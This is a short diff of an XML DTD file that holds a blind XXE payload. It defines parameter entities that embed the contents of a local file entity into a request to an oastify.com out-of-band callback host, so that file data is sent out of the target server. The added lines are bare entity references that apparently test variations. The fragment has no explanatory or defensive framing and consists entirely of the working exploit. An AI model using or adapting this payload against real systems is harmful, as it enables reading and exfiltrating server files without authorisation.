@@ -4,3 +4,6 @@
 <!ENTITY % abt "<!ENTITY exfil SYSTEM 'http://187hflsw0rb1sgveu111piwcl3rwfy3n.oastify.com/?x=%file;'>">
 %abt;
 %exfil;
+%test1
+%a
+%test2
